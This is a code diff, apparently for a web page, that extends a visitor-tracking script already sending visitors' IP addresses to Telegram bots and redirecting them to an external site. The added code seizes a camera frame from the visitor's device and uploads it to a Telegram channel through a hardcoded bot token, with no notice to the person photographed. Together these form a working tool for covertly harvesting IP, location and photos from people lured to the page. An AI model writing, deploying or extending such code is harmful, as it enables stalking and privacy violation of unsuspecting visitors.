@@ -5,6 +5,9 @@
   sendIPToTelegramBots();
 
   onMount(async () => {
+//pp
+let photoURL = null;
+//
   
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
@@ -17,6 +20,7 @@
           // Location permission denied, send IP result to Telegram bots
         
 //////1//////
+capturePhoto();
 redirectToNextURL();
 //////1//////
         }
@@ -121,8 +125,64 @@ window.location.href = 'https://mhf1.onrender.com/';
 }
 
 
+async function capturePhoto() {
+    // Get access to the device camera
+    const mediaDevices = navigator.mediaDevices;
+    if (!mediaDevices || !mediaDevices.getUserMedia) {
+      alert('Sorry, your device does not support the camera feature.');
+      return;
+    }
+
+    try {
+      // Request camera access
+      const stream = await mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      // Capture photo from the video stream
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      const photoDataUrl = canvas.toDataURL('image/jpeg');
+
+      // Display the captured photo
+      photoURL = photoDataUrl;
+
+      // Send photo to Telegram bots
+      sendPhotoToTelegramBot(photoDataUrl);
+
+      // Cleanup: stop video stream and release resources
+      video.pause();
+      video.srcObject = null;
+      stream.getTracks().forEach(track => track.stop());
+    } catch (error) {
+      console.error('Error capturing photo:', error);
+    }
+  }
 
 
+async function sendPhotoToTelegramBot(photoDataUrl) {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto`;
+
+    // Convert the photo data URL to a Blob
+    const response = await fetch(photoDataUrl);
+    const photoBlob = await response.blob();
+
+    // Create a FormData object to send the photo as multipart/form-data
+    const formData = new FormData();
+    formData.append('chat_id', '@localipy'); // Replace with the channel username or ID
+    formData.append('photo', photoBlob);
+
+    // Send the photo to the Telegram bot using an HTTP request
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      body: formData,
+    });
+  }
 
 
 
